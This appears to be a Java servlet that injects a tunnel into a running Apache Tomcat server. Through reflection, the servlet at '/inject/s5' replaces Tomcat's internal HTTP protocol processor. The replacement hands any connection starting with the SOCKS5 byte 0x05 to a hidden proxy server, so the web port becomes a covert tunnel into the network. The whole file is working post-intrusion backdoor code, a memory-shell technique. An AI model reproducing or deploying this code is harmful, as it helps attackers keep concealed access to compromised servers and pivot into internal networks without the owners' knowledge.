package org.example;

import org.apache.catalina.connector.Connector;
import org.apache.catalina.connector.Request;
import org.apache.coyote.Adapter;
import org.apache.coyote.Processor;
import org.apache.coyote.http11.Http11NioProtocol;
import org.apache.coyote.http11.Http11Processor;
import org.apache.tomcat.util.net.*;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Collections;

@WebServlet(urlPatterns = "/inject/s5")
public class socks5 extends HttpServlet {
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            Field reqF = req.getClass().getDeclaredField("request");
            reqF.setAccessible(true);
            Request request = (Request) reqF.get(req);
            Connector connector = request.getConnector();
            Http11NioProtocol protocolHandler = (Http11NioProtocol) connector.getProtocolHandler();

            // 获取handler
            Field handler = protocolHandler.getClass().getSuperclass().getSuperclass().getSuperclass()
                    .getDeclaredField("handler");
            handler.setAccessible(true);
            Object hd = handler.get(protocolHandler);

            // 获取proto
            Field proto = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler")
                    .getDeclaredField("proto");
            proto.setAccessible(true);
            Http11NioProtocol protocol = (Http11NioProtocol) proto.get(hd);

            // 获取adapter和endpoint
            Adapter adapter = protocol.getAdapter();
            Field endpoint = protocol.getClass().getSuperclass().getSuperclass().getSuperclass()
                    .getDeclaredField("endpoint");
            endpoint.setAccessible(true);
            AbstractEndpoint endpoint1 = (AbstractEndpoint) endpoint.get(protocol);

            // 创建新的协议处理器
            Http11NioProtocol protocol1 = new Http11NioProtocol() {
                @Override
                protected Processor createProcessor() {
                    Http11Processor http11Processor = new Http11Processor(protocol.getMaxHttpHeaderSize(),
                            protocol.getAllowHostHeaderMismatch(),
                            protocol.getRejectIllegalHeaderName(), endpoint1,
                            protocol.getMaxTrailerSize(),
                            Collections.singleton(protocol.getAllowedTrailerHeaders()),
                            protocol.getMaxExtensionSize(),
                            protocol.getMaxSwallowSize(),
                            null,
                            protocol.getSendReasonPhrase(),
                            protocol.getRelaxedPathChars(),
                            protocol.getRelaxedQueryChars()) {
                        @Override
                        public AbstractEndpoint.Handler.SocketState process(SocketWrapperBase<?> socketWrapper,
                                                                            SocketEvent status) throws IOException {
                            if (status == SocketEvent.OPEN_READ) {
                                NioChannel socket1 = (NioChannel) socketWrapper.getSocket();
                                SocketChannel ioChannel = socket1.getIOChannel();
                                ByteBuffer buffer = ByteBuffer.allocate(0);
                                int read = socketWrapper.read(false, buffer);
                                if (read < 0) {
                                    return super.process(socketWrapper, status);
                                }
                                ByteBuffer readBuffer = socketWrapper.getSocketBufferHandler().getReadBuffer();
                                byte b = readBuffer.get(0);
                                if (b == 0x05) {
                                    Socks5Server socks5Server = new Socks5Server();
                                    socks5Server.handleClient(ioChannel, socketWrapper);
                                    return AbstractEndpoint.Handler.SocketState.CLOSED;
                                }
                            }
                            return super.process(socketWrapper, status);
                        }
                    };
                    http11Processor.setAdapter(adapter);
                    return http11Processor;
                }
            };

            // 设置新的协议处理器
            protocol1.setAdapter(adapter);
            proto.set(hd, protocol1);

            // 重置处理器缓存
            Field recycledProcessors = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler")
                    .getDeclaredField("recycledProcessors");
            recycledProcessors.setAccessible(true);
            Object o = recycledProcessors.get(hd);
            Field stack = o.getClass().getSuperclass().getDeclaredField("stack");
            stack.setAccessible(true);
            Object[] objects = new Object[128];
            stack.set(o, objects);
            Field index = o.getClass().getSuperclass().getDeclaredField("index");
            index.setAccessible(true);
            // todo： 单线程，这里需要去实时修改，需要考虑到多用户的场景，可能会有
            index.set(o, -3);
            resp.getWriter().write("Processor injection successful!");
        } catch (Exception exception) {
            exception.printStackTrace();
            resp.getWriter().write("Error: " + exception.getMessage());
        }
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doPost(req, resp);
    }
}
